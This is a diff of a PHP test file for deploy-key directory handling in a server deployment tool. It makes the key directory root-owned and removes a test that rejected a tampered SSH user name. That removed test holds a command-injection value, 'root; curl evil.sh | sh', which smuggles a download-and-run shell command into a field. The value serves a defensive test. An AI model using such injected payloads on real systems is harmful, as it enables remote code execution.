@@ -87,20 +87,12 @@ test('the key directory is closed to other users before the key is written', fun
         ->and(deployKeys()->removeCommand($application))->toContain('rm -f');
 });
 
-test('the key directory is handed to the user that runs the clone', function () {
+test('the key directory stays root only whichever user signs in, because git clones as root', function () {
     $server = Server::factory()->create(['ssh_user' => 'deployer']);
     $application = Application::factory()->for($server)->create(['slug' => 'my-app']);
 
-    expect(deployKeys()->prepareDirectory($application))->toContain("chown 'deployer'");
+    expect(deployKeys()->prepareDirectory($application))->toBe("mkdir -p '/etc/coresmith/deploy-keys' && chown root:root '/etc/coresmith/deploy-keys' && chmod 700 '/etc/coresmith/deploy-keys'");
 });
-
-test('a tampered ssh user cannot be injected into the chown', function () {
-    $server = Server::factory()->create();
-    $server->forceFill(['ssh_user' => 'root; curl evil.sh | sh'])->saveQuietly();
-    $application = Application::factory()->for($server)->create(['slug' => 'my-app']);
-
-    deployKeys()->prepareDirectory($application->fresh());
-})->throws(UnsafeNameException::class);
 
 test('git is told to use only this key and to pin the host', function () {
     $application = Application::factory()->create(['slug' => 'my-app']);
